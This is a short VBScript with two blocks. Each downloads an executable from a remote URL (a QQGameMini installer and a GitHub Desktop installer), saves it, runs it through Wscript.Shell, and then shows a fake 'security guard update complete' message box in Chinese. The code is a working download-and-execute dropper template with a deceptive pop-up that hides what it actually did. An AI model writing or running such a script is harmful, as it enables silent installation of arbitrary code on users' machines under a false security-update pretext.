set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://fastsoft.onlinedown.net/down/QQGameMini_1080000015_0.exe",0
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "QQGameMini_1080000015_0.exe"
Set ws = CreateObject("Wscript.Shell")
ws.run "QQGameMini_1080000015_0.exe"
msgbox "xx安全卫士更新完毕!",vbyes,"提示:"

set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","https://desktop.githubusercontent.com/releases/2.1.0-80e9992d/GitHubDesktopSetup.exe",0
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "GitHubDesktopSetup.exe"
Set ws = CreateObject("Wscript.Shell")
ws.run "GitHubDesktopSetup.exe"
msgbox "xx安全卫士更新完毕!",vbyes,"提示:"